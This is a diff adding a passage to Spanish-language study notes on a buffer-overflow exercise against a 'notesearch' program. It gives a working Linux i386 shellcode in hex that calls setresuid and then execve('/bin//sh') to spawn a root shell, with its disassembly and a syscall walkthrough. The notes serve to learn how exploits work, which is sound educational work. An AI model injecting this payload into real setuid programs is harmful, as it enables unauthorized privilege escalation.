@@ -94,6 +94,43 @@
   de NOP's (para que la ejecucion termine cayendo al codigo inyectado) y que el stack frame de *notesearch*
   esta en posiciones mas bajas del stack.
   
+** Para probar el shellcode
+   Escribir el binario con un editor hexa (mc o Emacs con hexl-mode sirven). Ahi vamos escribiendo los
+   valores en hexadecimal, que luego pueden ser pasados por un programa como *objdump* para ver que
+   instrucciones representan en assembler: ~objdump -D <file> -m i386 -b binary~
   
+   La secuencia:
+   31c0 31db 31c9 99b0 a4cd 806a 0b58 5168
+   2f2f 7368 682f 6269 6e89 e351 89e2 5389 
+   e1cd 80                              
 
-    
+   representa el siguiente codigo en asm:
+#+NAME: shellcode
+#+BEGIN_SRC asm
+00000000 <.data>:
+   0:   31 c0                   xor    %eax,%eax
+   2:   31 db                   xor    %ebx,%ebx
+   4:   31 c9                   xor    %ecx,%ecx
+   6:   99                      cltd   
+   7:   b0 a4                   mov    $0xa4,%al
+   9:   cd 80                   int    $0x80
+   b:   6a 0b                   push   $0xb
+   d:   58                      pop    %eax
+   e:   51                      push   %ecx
+   f:   68 2f 2f 73 68          push   $0x68732f2f
+  14:   68 2f 62 69 6e          push   $0x6e69622f
+  19:   89 e3                   mov    %esp,%ebx
+  1b:   51                      push   %ecx
+  1c:   89 e2                   mov    %esp,%edx
+  1e:   53                      push   %ebx
+  1f:   89 e1                   mov    %esp,%ecx
+  21:   cd 80                   int    $0x80
+#+END_SRC
+   
+   La instruccion ~int $0x80 (syscall)~ es una interrupcion especial al kernel. Expresa que el programa le esta
+   pidiendo una accion especial al kernel. El interrupt 0x80 toma de EAX el llamado a realizar. En este caso,
+   resulta ~eax = 0xa4 (164)~, que, viendo en [[/usr/include/i386-linux-gnu/asm/unistd_32.h][unistd_32.h]], significa que se va a ejecutar la funcion 
+   *setresuid* (existe una funcion wrapper en C, de ese nombre).
+
+   La proxima interrupcion ~int $0x80~ se hace con el valor 0xb en EAX, por lo que se ejecuta la funcion
+   *execve* (ejecutar programa).
